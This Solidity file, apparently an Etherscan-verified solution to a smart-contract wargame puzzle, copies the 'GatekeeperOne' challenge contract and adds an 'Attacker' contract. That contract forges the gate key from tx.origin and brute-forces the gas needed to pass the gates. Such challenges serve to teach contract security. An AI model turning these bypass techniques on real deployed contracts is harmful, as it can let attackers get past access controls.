/**
 *Submitted for verification at Etherscan.io on 2022-08-21
*/

pragma solidity >=0.8.0;

contract GatekeeperOne {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % (8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attacker {

    function attack() external {
        GatekeeperOne gateKeeper = GatekeeperOne(address(0xAa5694477eB657cC778b26C499b45dD1E97BF945));
        bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) + uint64(1 << 32));
        for (uint256 i = 0; i < 120; i++) {
            try gateKeeper.enter{gas: i + 150 + 8191 * 3}(key) {
                break;
            } catch Error(string memory reason)  {

            }
        }

        
    }
}